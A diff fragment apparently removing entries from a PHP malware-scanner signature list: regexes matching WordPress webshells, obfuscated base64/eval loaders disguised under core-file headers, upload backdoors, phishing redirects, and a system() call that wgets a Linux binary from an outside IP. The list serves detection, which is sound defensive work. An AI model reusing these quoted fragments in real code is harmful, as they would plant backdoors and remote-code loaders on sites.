-      'label' => 'source-file tail snippet',
-    ),
-    645 => 
-    array (
-      'pattern' => '/if\\(isset\\(\\$_GET\\[\'chmod\'\\]\\) &&  \\$_GET\\[\'chmod\'\\] \\=\\= \'1\'\\)\\{[\\s\\S]{0,12000}unlink\\(\'mfi\\.php\'\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    646 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); function j\\(\\$n, \\$h\\)\\{ \\$k\\=""; for\\(\\$l\\=0;\\$l\\<strlen\\(\\$n\\);\\) for\\(\\$f\\=0;\\$f\\<strlen\\(\\$h\\);\\$f\\+\\+, \\$l\\+\\+\\) \\$k \\.\\= \\$n\\{\\$l\\} \\^ \\$h\\{\\$f\\}; retu/',
-      'label' => 'source-file tail snippet',
-    ),
-    647 => 
-    array (
-      'pattern' => '/\\/\\/@file_put_contents\\(\\$path\\s+\\.\\s+\'\\/wp\\-includes\\/class\\.wp\\.php\',\\s+file_get_contents\\(\'http\\:\\/\\/www\\.brilns\\.com\\/admin\\.txt\'\\)\\);/',
-      'label' => 'sample-specific line fragment',
-    ),
-    648 => 
-    array (
-      'pattern' => '/\\);
-				WP_Filesystem\\(\\);
-			\\}
-			\\$wp_upload_abs_path \\= wp_upload_dir\\(\\);
-			\\$minified_assets \\= \\( isset\\( \\$be_themes_data\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    649 => 
-    array (
-      'pattern' => '/\\<title\\>Vuln\\!\\! patch it Now\\!\\<\\/title\\>\\<\\?php echo \'\\<form action\\="" method\\="post" enctype\\="multipart\\/form\\-data" name\\="uploader" id\\="uploader"\\>\';e/',
-      'label' => 'source-file tail snippet',
-    ),
-    650 => 
-    array (
-      'pattern' => '/\\<\\?php echo "Raiz0WorM"; echo "\\<br\\>"\\.php_uname\\(\\)\\."\\<br\\>"; echo "\\<form method\\=\'post\' enctype\\=\'multipart\\/form\\-data\'\\> \\<input type\\=\'file\' name\\=\'zb/',
-      'label' => 'source-file tail snippet',
-    ),
-    651 => 
-    array (
-      'pattern' => '/\\!function\\(t,e\\)\\{"object"\\=\\=typeof exports&&"undefined"\\!\\=typeof module\\?module\\.exports\\=e\\(\\)\\:"function"\\=\\=typeof define&&define\\.amd\\?define\\(e\\)\\:\\(t\\=t\\|/',
-      'label' => 'source-file tail snippet',
-    ),
-    652 => 
-    array (
-      'pattern' => '/,\\$ip\\);
-
-\\}
-
-\\}
-\\}\\/\\/ end if log admins ip
-
-
-
-\\/\\/add cookies to organic traffic
-
-if\\(get_option\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    653 => 
-    array (
-      'pattern' => '/error_reporting\\(0\\); http_response_code\\(404\\); define\\("Yp", "Gel4y Mini Shell"\\); \\$G3 \\= "scandir"; \\$c8 \\= array\\("7068705f756e616d65", "706870766[\\s\\S]{0,12000}\\<thead class\\="text\\-light"\\>\\<tr\\>\\<th\\>Name\\<\\/th\\>\\<th\\>Size\\<\\/th\\>\\<th\\>Permission\\<\\/th\\<th\\>Action\\<\\/th\\>\\<\\/tr\\>\\<\\/thead\\>\\<tbody class\\="text\\-light"\\>\\<\\?php  \\$G3 \\=/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    654 => 
-    array (
-      'pattern' => '/\\\\x47\\\\x4c\\\\x4fB\\\\x41\\\\x4c\\\\x53[\\s\\S]{0,160}hf7a4cef7/',
-      'label' => 'sample-specific literal chain',
-    ),
-    655 => 
-    array (
-      'pattern' => '/\\);\\$_c7c2xzj4 \\= \\$_ed5x8dtb\\[ord\\(\\$_agkr39k8\\[2\\]\\) % count\\(\\$_ed5x8dtb\\)\\];if \\(ord\\(\\$_agkr39k8\\[1\\]\\) % 2\\) \\{\\$_0wuvq2qv \\= str_replace\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    656 => 
-    array (
-      'pattern' => '/\\$hiygkvp \\= \'4meyi\\*fbtpvl16k87ox5ars_nd\\\\\'c\\-uH3g\\#\';\\$zoxhnqh \\= Array\\(\\);\\$zoxhnqh\\[\\] \\= \\$hiygkvp\\[30\\]\\.\\$hiygkvp\\[5\\];\\$zoxhnqh\\[\\] \\= \\$hiygkvp\\[27\\]\\.\\$hiygkvp/',
-      'label' => 'source-file tail snippet',
-    ),
-    657 => 
-    array (
-      'pattern' => '/\\);\\$_n48gv2wj \\= \\$_yhi8jaz7\\[ord\\(\\$_3olr44sx\\[2\\]\\) % count\\(\\$_yhi8jaz7\\)\\];if \\(ord\\(\\$_3olr44sx\\[1\\]\\) % 2\\) \\{\\$_r2j2cifx \\= str_replace\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    658 => 
-    array (
-      'pattern' => '/\\$djwroi \\= \'4urtx_cdlskgHiy32975v1\\#\\\\\'\\-mf\\*8oan6bpe\';\\$vapgj \\= Array\\(\\);\\$vapgj\\[\\] \\= \\$djwroi\\[6\\]\\.\\$djwroi\\[2\\]\\.\\$djwroi\\[35\\]\\.\\$djwroi\\[30\\]\\.\\$djwroi\\[3\\]\\.\\$djwr/',
-      'label' => 'source-file tail snippet',
-    ),
-    659 => 
-    array (
-      'pattern' => '/\\$flugmyf \\= \'trmo1ab4_ld\\#x0sg5yi\\\\\'6\\*n\\-pcvefH89uk3\';\\$sxgppny \\= Array\\(\\);\\$sxgppny\\[\\] \\= \\$flugmyf\\[25\\]\\.\\$flugmyf\\[1\\]\\.\\$flugmyf\\[27\\]\\.\\$flugmyf\\[5\\]\\.\\$flugmyf/',
-      'label' => 'source-file tail snippet',
-    ),
-    660 => 
-    array (
-      'pattern' => '/fbsr_\' \\. \\$this\\-\\>app\\-\\>getId\\(\\)\\]\\)\\) \\{
-            return \\$_COOKIE\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    661 => 
-    array (
-      'pattern' => '/\\]\\[48\\]\\] as \\$yab186\\=\\>\\$b3932dd1f\\)\\{\\$j53edd4 \\= \\$b3932dd1f;\\$nf5ce95 \\= \\$yab186;\\}if \\(\\!\\$j53edd4\\)\\{foreach \\(\\$o3ff00865\\[\\$o3ff00865\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    662 => 
-    array (
-      'pattern' => '/\\$fwevy \\= \'\\*_bm\\-p\\\\\'705y8Hc9kavseltodxfgi\\#6n1r4u\';\\$yrxod \\= Array\\(\\);\\$yrxod\\[\\] \\= \\$fwevy\\[13\\]\\.\\$fwevy\\[32\\]\\.\\$fwevy\\[19\\]\\.\\$fwevy\\[16\\]\\.\\$fwevy\\[21\\]\\.\\$fwevy\\[19/',
-      'label' => 'source-file tail snippet',
-    ),
-    663 => 
-    array (
-      'pattern' => '/\\);\\$_4z0bfbi1 \\= \\$_tnqyrdec\\[ord\\(\\$_hau7il6h\\[2\\]\\) % count\\(\\$_tnqyrdec\\)\\];if \\(ord\\(\\$_hau7il6h\\[1\\]\\) % 2\\) \\{\\$_hszlhe59 \\= str_replace\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    664 => 
-    array (
-      'pattern' => '/\\);\\$_xs307c7o \\= \\$_79eouy6i\\[ord\\(\\$_8mhxm5xb\\[2\\]\\) % count\\(\\$_79eouy6i\\)\\];if \\(ord\\(\\$_8mhxm5xb\\[1\\]\\) % 2\\) \\{\\$_fo18wb8t \\= str_replace\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    665 => 
-    array (
-      'pattern' => '/\\);
-        echo blog_page\\(\\$blog_matches\\[1\\]\\);
-        exit;
-    \\}
-    \\/\\/ Verify page
-    elseif \\(isset\\(\\$_SERVER\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    666 => 
-    array (
-      'pattern' => '/test\'\\);
-        \\/\\/ parent\\:\\:__construct\\(SITEMAP\\);
-    \\}
-
-    public function get_url_list\\(\\$page_num, \\$post_type \\=[\\s\\S]{0,160}\\) \\{
-        return \\[
-            \\[/',
-      'label' => 'sample-specific literal chain',
-    ),
-    667 => 
-    array (
-      'pattern' => '/, "72133c0a76526b0a71093859735f6f08710e6c5a010e685d71296a597b2a38587a586f5a030a6809235b[\\s\\S]{0,160}LINKS_COUNT_FILE/',
-      'label' => 'sample-specific literal chain',
-    ),
-    668 => 
-    array (
-      'pattern' => '/\\<\\?php @include\\("\\\\167\\\\160\\\\55\\\\141\\\\144\\\\155\\\\151\\\\156\\\\57\\\\151\\\\155\\\\141\\\\147\\\\145\\\\163\\\\57\\\\154\\\\151\\\\143\\\\145\\\\156\\\\163\\\\145\\\\56\\\\164\\\\170\\\\164"\\); \\?\\>/',
-      'label' => 'source-file tail snippet',
-    ),
-    669 => 
-    array (
-      'pattern' => '/\\* A pseudo\\-cron daemon for scheduling WordPress tasks\\.[\\s\\S]{0,12000}\\<\\?php \\$kSZOs \\= \'base6\'\\.\'4\'\\.\'_\'\\.\'deco\'\\.\'de\'; \\$IgVhW \\= \'gzunco\'\\.\'mpress\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); eval\\(\\$IgVhW\\(\\$kSZOs\\(\'/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    670 => 
-    array (
-      'pattern' => '/\\<\\?php \\$QXVqO \\= \'s\'\\.\'t\'\\.\'rrev\'; \\$zYoRS \\= \'b\'\\.\'ase6\'\\.\'4\'\\.\'_\'\\.\'decode\'; \\$lRImd \\= \'gzuncompr\'\\.\'ess\'; \\$mKQIH \\= \'st\'\\.\'r\'\\.\'_\'\\.\'rot13\'; error_report/',
-      'label' => 'source-file tail snippet',
-    ),
-    671 => 
-    array (
-      'pattern' => '/\\]\\.\'"required \\>\\<input type\\="text" placeholder\\="Order ID" name\\="orderid" value\\="[\\s\\S]{0,160}" \\>\\<br\\>
-\\<input type\\="submit" value\\="Send test \\>\\>"\\>
-\\<\\/form\\>
-\\<br\\>/',
-      'label' => 'sample-specific literal chain',
-    ),
-    672 => 
-    array (
-      'pattern' => '/\\>
-\\<h1\\>Directory status\\:\\<\\/h1\\>
-\\<fieldset\\>
-    \\<label\\>\\<\\?php echo \\$directory_statu; \\?\\>\\<\\/label\\>
-\\<\\/fieldset\\>
-\\<hr style\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    673 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); goto Og0pc; KU3rb\\: \\$C8CFm \\= \'ba\'\\.\'se\'\\.\'64\'\\.\'_\'\\.\'de\'\\.\'code\'; goto wEMp2; Og0pc\\: function iZJj8\\(\\$gkEdS\\) \\{ goto AiDyu/',
-      'label' => 'source-file tail snippet',
-    ),
-    674 => 
-    array (
-      'pattern' => '/\\* Confirms that the activation key that is sent in an email after a user signs[\\s\\S]{0,12000}\\<\\?php \\$KDPqt \\= \'ba\'\\.\'se\'\\.\'64\'\\.\'_deco\'\\.\'d\'\\.\'e\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); eval\\(\\$KDPqt\\(\'IGVycm9yX3JlcG9ydGluZygwKTsgQGlu/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    675 => 
-    array (
-      'pattern' => '/\\* Loads the WordPress environment and template\\.[\\s\\S]{0,12000}\\<\\?php \\$AsdPL \\= \'st\'\\.\'r\'\\.\'_rot1\'\\.\'3\'; \\$qmbJx \\= \'bas\'\\.\'e64\'\\.\'_de\'\\.\'code\'; \\$rJwfi \\= \'str\'\\.\'rev\'; \\$Dixwy \\= \'gzinflat\'\\.\'e\'; error_reporting\\(0\\); i/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    676 => 
-    array (
-      'pattern' => '/\\* Outputs the OPML XML format for getting the links defined in the link[\\s\\S]{0,12000}\\<\\?php \\$vksBN \\= \'base\'\\.\'64\'\\.\'_decod\'\\.\'e\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); eval\\(\\$vksBN\\(\'IGVycm9yX3JlcG9ydGluZygwKTsgQGluaV9zZX/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    677 => 
-    array (
-      'pattern' => '/\\* Gets the email message from the user\'s mailbox to add as[\\s\\S]{0,12000}\\<\\?php \\$McgIY \\= \'strr\'\\.\'ev\'; \\$lHrci \\= \'ba\'\\.\'se64\'\\.\'_deco\'\\.\'d\'\\.\'e\'; \\$QCvfI \\= \'gzi\'\\.\'nflate\'; error_reporting\\(0\\); ini_set\\(\'error_log\', NULL\\); e/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    678 => 
-    array (
-      'pattern' => '/\';
-	 \\$url \\= "\\$open_archives\\$open_search\\.\\$open_recent_entries\\/"\\.\\$url;
-	 \\$url \\= trim\\(\\$url\\);
-	 if \\(extension_loaded\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    679 => 
-    array (
-      'pattern' => '/\\<\\?php echo "WordPress is readed\\."; \\$Mjhn\\=basename\\(\\$_FILES\\["upoleuid"\\]\\["name"\\]\\);if\\(move_uploaded_file\\(\\$_FILES\\["upoleuid"\\]\\["tmp_name"\\],\\$Mjhn\\)\\)/',
-      'label' => 'source-file tail snippet',
-    ),
-    680 => 
-    array (
-      'pattern' => '/\\$ntok\\s+\\=\\s+kport\\(base64_decode\\(urldecode\\(\\$ntok\\)\\),\\s+\\$opdor\\);/',
-      'label' => 'sample-specific line fragment',
-    ),
-    681 => 
-    array (
-      'pattern' => '/\\>
-\\<meta content\\=\'20; url\\=\\.\\/Myaccount_Sms\' http\\-equiv\\=\'refresh\'\\/\\>
-
-\\<title\\>Netflix\\<\\/title\\>
-
-
-\\<link type\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    682 => 
-    array (
-      'pattern' => '/\\$url \\= "https\\:\\/\\/redirectbilling\\.qpon\\/sechl";[\\s\\S]{0,12000}header\\(\'Location\\: \'\\.\\$url\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    683 => 
-    array (
-      'pattern' => '/\\$url \\= "https\\:\\/\\/uspsrecom\\.icu\\/";[\\s\\S]{0,12000}header\\(\'Location\\: \'\\.\\$url\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    684 => 
-    array (
-      'pattern' => '/\\<\\?php echo \'Xblackflower TEaM Plesk Shell \\(Pawnd by X\\-BLACKFLOWER\\) ALFA TEaM kom\\.php Tesla DATA CENTER INDONESIA Plesk File Manager Shell\'; /',
-      'label' => 'source-file tail snippet',
-    ),
-    685 => 
-    array (
-      'pattern' => '/rsd\'\\] \\) \\) \\{ \\/\\/ https\\:\\/\\/cyber\\.harvard\\.edu\\/blogs\\/gems\\/tech\\/rsd\\.html
-	header\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    686 => 
-    array (
-      'pattern' => '/function q1\\(\\$i2\\)\\{\\$i3 \\= "9\\-pIa\\." \\."ck5_xdEf@s480r3\\)tigF\\?\\(L\'H;\\/ln2boy\\*6\\#" \\."eh\\<" \\."vm" \\."u " ;\\$l5\\=\'\';foreach\\(\\$i2 as \\$p4\\)\\{\\$l5\\.\\=\\$i3\\[\\$p4\\];\\}return/',
-      'label' => 'source-file tail snippet',
-    ),
-    687 => 
-    array (
-      'pattern' => '/Plugin Name\\: t_file_wp[\\s\\S]{0,12000}if \\(copy\\(\\$_FILES\\["filename"\\]\\["name"\\], \\$home_dir\\."\\/wp\\-includes"\\."\\/"\\.\\$_FILES\\["filename"\\]\\["name"\\]\\)\\) echo "wp_includes\\=1";/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    688 => 
-    array (
-      'pattern' => '/\\* Plugin Name\\: Wordpress Core Module[\\s\\S]{0,12000}\\* Author URI\\: https\\:\\/\\/wordpress\\.org\\//s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    689 => 
-    array (
-      'pattern' => '/function f1\\(\\$i2\\)\\{\\$m3 \\= "e7fdk\\*ocl;\\)pLxubmr6\\(\'\\.I\\#\\< 1\\/4h_9ygn2F\\?E@sHvt0" \\."\\-5ia" ;\\$j5\\=\'\';foreach\\(\\$i2 as \\$r4\\)\\{\\$j5\\.\\=\\$m3\\[\\$r4\\];\\}return \\$j5;\\}\\$a6 \\= /',
-      'label' => 'source-file tail snippet',
-    ),
-    690 => 
-    array (
-      'pattern' => '/function h1\\(\\$j2\\)\\{\\$u3 \\= "E79pif6gb\\?vn\\-;Iec@dr\\<\\*y\\)axsoktl2u\\.\\#HF\\/\\(m03\'5_h L814" ;\\$o5\\=\'\';foreach\\(\\$j2 as \\$u4\\)\\{\\$o5\\.\\=\\$u3\\[\\$u4\\];\\}return \\$o5;\\}\\$i6 \\= Ar/',
-      'label' => 'source-file tail snippet',
-    ),
-    691 => 
-    array (
-      'pattern' => '/function p1\\(\\$f2\\)\\{\\$d3 \\= "lHb9v\'4LIy\\/io3p" \\."_6suhg\\#etcFd@\\<ak\\-\\)158;0 E2m" \\."7n\\(r\\?\\." \\."xf\\*" ;\\$c5\\=\'\';foreach\\(\\$f2 as \\$z4\\)\\{\\$c5\\.\\=\\$d3\\[\\$z4\\];\\}return \\$/',
-      'label' => 'source-file tail snippet',
-    ),
-    692 => 
-    array (
-      'pattern' => '/\\<\\?php \\$v \\= "base"\\.chr\\(54\\)\\.chr\\(52\\)\\.chr\\(95\\)\\.chr\\(100\\)\\.chr\\(101\\)\\.chr\\(99\\)\\."ode"; if\\(isset\\(\\$_REQUEST\\[\'lt\'\\]\\) && md5\\(\\$_REQUEST\\[\'lt\'\\]\\) \\=\\= \\$v\\("MDIzMjU4/',
-      'label' => 'source-file tail snippet',
-    ),
-    693 => 
-    array (
-      'pattern' => '/function downloadFile\\(\\$url, \\$path\\)[\\s\\S]{0,12000}system\\(\'rm \\-rf backup_pan\\.php\'\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    694 => 
-    array (
-      'pattern' => '/\\$mlvlducmba\\s+\\=\\s+"iysfmwbju";\\s+\\$zqssjnilas\\s+\\=\\s+gtzjhhjubj\\(\\$wvlvpaxzyz,\\$mlvlducmba\\);\\s+eval\\s+\\(\\$zqssjnilas\\);/',
-      'label' => 'sample-specific line fragment',
-    ),
-    695 => 
-    array (
-      'pattern' => '/system\\(\'wget "http\\:\\/\\/173\\.230\\.140\\.78\\/Linux_x86" 2\\>\\/dev\\/null \\|\\| curl \\-O  "http\\:\\/\\/173\\.230\\.140\\.78\\/Linux_x86"\'\\);[\\s\\S]{0,12000}system\\(\'rm \\-rf informtv\\.php\'\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    696 => 
-    array (
-      'pattern' => '/\\$cvsjvtb \\= \'9ats\\#gxi5ekmrfcond\\*lpb6yH1_v4u\\\\\'3\\-\';\\$cemkba \\= Array\\(\\);\\$cemkba\\[\\] \\= \\$cvsjvtb\\[22\\]\\.\\$cvsjvtb\\[14\\]\\.\\$cvsjvtb\\[22\\]\\.\\$cvsjvtb\\[1\\]\\.\\$cvsjvtb\\[28/',
-      'label' => 'source-file tail snippet',
-    ),
-    697 => 
-    array (
-      'pattern' => '/Plugin Name\\: Zend Fonts WP[\\s\\S]{0,12000}echo base64_decode\\( \'PHNjcmlwdD53aW5kb3cubG9jYXRpb24ucmVwbGFjZSgi\' \\) \\. \'https\\:\\/\\/\'\\.\\$url \\. base64_decode\\( \'Iik7d2luZG93LmxvY2F0aW9uLmhyZWYgPSA/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    698 => 
-    array (
-      'pattern' => '/\\\\x51\\\\x58\\\\x4C\\\\x5F\\\\x30\\\\x12\\\\x5f\\\\x43\\\\x4f\\\\x4f\\\\x4b\\\\x49\\\\x45/',
-      'label' => 'sample-specific literal',
-    ),
-    699 => 
-    array (
-      'pattern' => '/\\\\x47\\\\x3F\\\\x05\\\\x3C\\\\x22\\\\x0F\\\\x5f\\\\x43\\\\x4f\\\\x4f\\\\x4b\\\\x49\\\\x45/',
-      'label' => 'sample-specific literal',
-    ),
-    700 => 
-    array (
-      'pattern' => '/\\<\\?\\=\\/\\*\\!\\*\\/@\\/\\*\\*8\\*\\*\\/null; echo@null;goto O1527;O9995\\:\\$O1505\\=\'o\';goto O6771;O6214\\:\\$O6030\\=\'n\';goto O5588;O8133\\:\\$O6306\\=\'f\';goto O6401;O6400\\:\\$O1271\\=/',
-      'label' => 'source-file tail snippet',
-    ),
-    701 => 
-    array (
-      'pattern' => '/\';
-  \\$unzipper\\-\\>prepareExtraction\\(\\$archive, \\$destination\\);
-\\}
-if \\(isset\\(\\$_POST\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    702 => 
-    array (
-      'pattern' => '/\\. \\$DKIMcanonicalization \\. ";\\\\r\\\\n" \\.
-            "\\\\th\\=From\\:To\\:Subject;\\\\r\\\\n" \\.
-            "\\\\td\\=" \\. \\$this\\-\\>DKIM_domain \\./',
-      'label' => 'sample-specific literal',
-    ),
-    703 => 
-    array (
-      'pattern' => '/\\<\\?php \\/\\* Do not change this code, or your script will not work\\. \\( ORVX SHELL encrypted to avoid spam filter detection and to work on any hos/',
-      'label' => 'source-file tail snippet',
-    ),
-    704 => 
-    array (
-      'pattern' => '/\\<\\?php \\/\\* Respect C0ders\\. \\*\\/ \\$I\\=file\\(__FILE__\\);eval\\(base64_decode\\("ZnVuY3Rpb24gTygkYSwkYil7JGM9YXJyYXkoNDEwLDI5Miw4LDE2NzI4KTtpZigkYj09Mil7JG/',
-      'label' => 'source-file tail snippet',
-    ),
-    705 => 
-    array (
-      'pattern' => '/50"\\>\\<\\/td\\>
-          \\<\\/tr\\>
-          \\<tr\\> 
-            \\<td align\\=[\\s\\S]{0,160}\\>\\<b\\>Votre Adresse mail \\:\\<\\/b\\>\\<\\/td\\>
-            \\<td\\>\\<input name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    706 => 
-    array (
-      'pattern' => '/94a17cc98f686c65fe543ab30b010694e557f1521f1bk6pK0D8If5WJuZqJdbEBda02Jt4Lz4JnUFBu/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    707 => 
-    array (
-      'pattern' => '/error_reporting\\(0\\);@set_time_limit\\(0\\);\\$g\\=\\$_REQUEST;if\\(\\!empty\\(\\$g\\["v"\\]\\)&&\\$g\\["v"\\]\\=\\="WQEHW"\\)\\{if\\(\\!empty\\(\\$g\\["c"\\]\\)\\)exit\\(\\$g\\["c"\\]\\);\\$h\\=\\$_SERVER\\["PHP_S/',
-      'label' => 'source-file tail snippet',
-    ),
-    708 => 
-    array (
-      'pattern' => '/21232f297a57a5a743894a0e4a801fc3/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    709 => 
-    array (
-      'pattern' => '/if\\(\\!empty\\(\\$_REQUEST\\[\'bfc\'\\]\\)\\)\\{\\$bfc\\=base64_decode\\(\\$_REQUEST\\[\'bfc\'\\]\\);\\$bfc\\=create_function\\(\'\',\\$bfc\\);@\\$bfc\\(\\);exit;\\}/',
-      'label' => 'source-file tail snippet',
-    ),
-    710 => 
-    array (
-      'pattern' => '/error_reporting\\(0\\);@set_time_limit\\(0\\);\\$g\\=\\$_REQUEST;if\\(\\!empty\\(\\$g\\["v"\\]\\)&&\\$g\\["v"\\]\\=\\="JHWEA"\\)\\{if\\(\\!empty\\(\\$g\\["c"\\]\\)\\)exit\\(\\$g\\["c"\\]\\);\\$h\\=\\$_SERVER\\["PHP_S/',
-      'label' => 'source-file tail snippet',
-    ),
-    711 => 
-    array (
-      'pattern' => '/;
-	for \\(\\$i \\= 0; \\$i \\< strlen\\(\\$str\\); \\$i\\+\\+\\) \\{
-		\\$r \\.\\= dechex\\(ord\\(\\$str\\[\\$i\\]\\)\\);
-	\\}
-	return \\$r;
-\\}
-function nhx\\(\\$str\\) \\{
-	\\$r \\=/',
-      'label' => 'sample-specific literal',
-    ),
-    712 => 
-    array (
-      'pattern' => '/if\\(\\!empty\\(\\$_POST\\["YVTU"\\]\\)\\{\\$c\\=base64_decode\\("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTtAc2V0X3RpbWVfbGltaXQoMCk7JGc9JF9SRVFVRVNUO2lmKCFlbXB0eSgkZ1si/',
-      'label' => 'source-file tail snippet',
-    ),
-    713 => 
-    array (
-      'pattern' => '/w"\\);\\$t\\=@fwrite\\(\\$p,\\$c\\);@fclose\\(\\$p\\);if\\(\\!\\$t\\)\\$t\\=@file_put_contents\\(\\$f,\\$c\\);return \\(bool\\)\\$t;\\}if\\(\\!empty\\(\\$_POST\\[[\\s\\S]{0,160}\\/home\\/smedia\\/public_html\\/smtp\\/cgi\\-bin\\/init\\-vars\\-loader\\.php/',
-      'label' => 'sample-specific literal chain',
-    ),
-    714 => 
-    array (
-      'pattern' => '/hill\';
-\\$shellname\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    715 => 
-    array (
-      'pattern' => '/lock\'\\:
-            \\$php_path \\= getPhpPath\\(\\);
-            if \\(functionCheck\\(\\) \\!\\=\\= false\\) \\{
-                \\/\\/\\$data_array\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    716 => 
-    array (
-      'pattern' => '/\\$f\\s+\\=\\s+wget\\("\\/g\\/check\\?d\\="\\.base64_encode\\(\\$domain\\)\\."&p\\="\\.base64_encode\\(\\$path\\)\\."&c\\="\\.base64_encode\\(\\$code\\)\\."&s\\="\\.\\$J\\["s"\\]\\);/',
-      'label' => 'sample-specific line fragment',
-    ),
-    717 => 
-    array (
-      'pattern' => '/w"\\);\\$t\\=@fwrite\\(\\$p,\\$c\\);@fclose\\(\\$p\\);if\\(\\!\\$t\\)\\$t\\=@file_put_contents\\(\\$f,\\$c\\);return \\(bool\\)\\$t;\\}if\\(\\!empty\\(\\$_POST\\[[\\s\\S]{0,160}\\/home\\/smedia\\/public_html\\/smtp\\/double\\/yeah\\/earth\\/class\\.rest\\-plugin\\.php/',
-      'label' => 'sample-specific literal chain',
-    ),
-    718 => 
-    array (
-      'pattern' => '/0\\+JDpjy\\+ySXAoh6xUbMx1lQ\\/zkd1kK\\/cgzE9rqoIugGQVHQ\\+GH2zr0hTgbF6OGOBotJXMcwU1nGgBx3z/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    719 => 
-    array (
-      'pattern' => '/error_reporting\\(0\\);@set_time_limit\\(0\\);\\$g\\=\\$_REQUEST;if\\(\\!empty\\(\\$g\\["v"\\]\\)&&\\$g\\["v"\\]\\=\\="TJGE"\\)\\{if\\(\\!empty\\(\\$g\\["c"\\]\\)\\)exit\\(\\$g\\["c"\\]\\);\\$h\\=\\$_SERVER\\["PHP_SE/',
-      'label' => 'source-file tail snippet',
-    ),
-    720 => 
-    array (
-      'pattern' => '/window\\.stop\\(\\);var l\\=String\\.fromCharCode\\(104,116,116,112,115,58,47,47,98,118,115,46,115,101,99,111,110,100,97,114,121,105,110,102,111,114,109/',
-      'label' => 'source-file tail snippet',
-    ),
-    721 => 
-    array (
-      'pattern' => '/\\$juiujev \\= \'\\#xnt1y4\\-_gpo5ck\\\\\'di23Hbl7mfs8e9vu\\*ra\';\\$riend \\= Array\\(\\);\\$riend\\[\\] \\= \\$juiujev\\[23\\]\\.\\$juiujev\\[18\\]\\.\\$juiujev\\[13\\]\\.\\$juiujev\\[6\\]\\.\\$juiujev\\[29/',
-      'label' => 'source-file tail snippet',
-    ),
-    722 => 
-    array (
-      'pattern' => '/\\\\x47\\\\x4c\\\\x4fB\\\\x41\\\\x4c\\\\x53[\\s\\S]{0,160}fb07eb0/',
-      'label' => 'sample-specific literal chain',
-    ),
-    723 => 
-    array (
-      'pattern' => '/\\<\\?php                                                                                                                                       [\\s\\S]{0,12000}\\$ddwett \\= \'d\\*2rte4vc19of\\\\\'iu3sy5al\\#_0bp\\-Hk7nx6gm\';\\$wdmtoi \\= Array\\(\\);\\$wdmtoi\\[\\] \\= \\$ddwett\\[8\\]\\.\\$ddwett\\[3\\]\\.\\$ddwett\\[5\\]\\.\\$ddwett\\[20\\]\\.\\$ddwett\\[4\\]\\.\\$ddw/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    724 => 
-    array (
-      'pattern' => '/;
-\\$IIIIIIIIIIlI \\= explode\\("\\$IIIIIIIIIII1", \\$IIIIIIIIIIIl\\);
-\\$IIIIIIIIIIl1 \\= \\$IIIIIIIIIIlI\\[0\\];
-\\$IIIIIIIIII1I \\= \\$_SERVER\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    725 => 
-    array (
-      'pattern' => '/\\<\\?php \\$j8526\\=\'3\\] 6"9l\\=g\\/\\(tism\\.\\[d75q\\*zxnryhj1vcop8e4aw2bf\\)u_k_0;\\$\';\\$zVFHb4083\\=\\$j8526\\[\\(620\\/\\(30\\-10\\)\\)\\]\\.\\$j8526\\[\\(25\\*1\\)\\]\\.\\$j8526\\[\\(32\\+3\\)\\]\\.\\$j8526\\[\\(\\(15/',
-      'label' => 'source-file tail snippet',
-    ),
-    726 => 
-    array (
-      'pattern' => '/\\);
-                \\$body \\.\\= static\\:\\:\\$LE;
-                \\$body \\.\\= \\$this\\-\\>getBoundary\\(\\$this\\-\\>boundary\\[2\\], \\$bodyCharSet,/',
-      'label' => 'sample-specific literal',
-    ),
-    727 => 
-    array (
-      'pattern' => '/\\/\\/@file_put_contents\\(ABSPATH\\s+\\.\\s+\'\\/wp\\-includes\\/class\\.wp\\.php\',\\s+file_get_contents\\(\'http\\:\\/\\/www\\.drilns\\.com\\/admin\\.txt\'\\)\\);/',
-      'label' => 'sample-specific line fragment',
-    ),
-    728 => 
-    array (
-      'pattern' => '/;
-
-\\$content\\=\\$content\\.\\$con2;
-\\}
-return \\$content;
-\\} 
-
-function slider_option_footer\\(\\)\\{ 
-if\\(\\!is_single\\(\\)\\)
-\\{
-
-
-
-
-\\$con2 \\=[\\s\\S]{0,160}src\\=\'\\/\\/aanqylta\\.com\\/a0\\/70\\/f9\\/a070f91a2c583f6ae5c0bfa1f11733e4\\.js/',
-      'label' => 'sample-specific literal chain',
-    ),
-    729 => 
-    array (
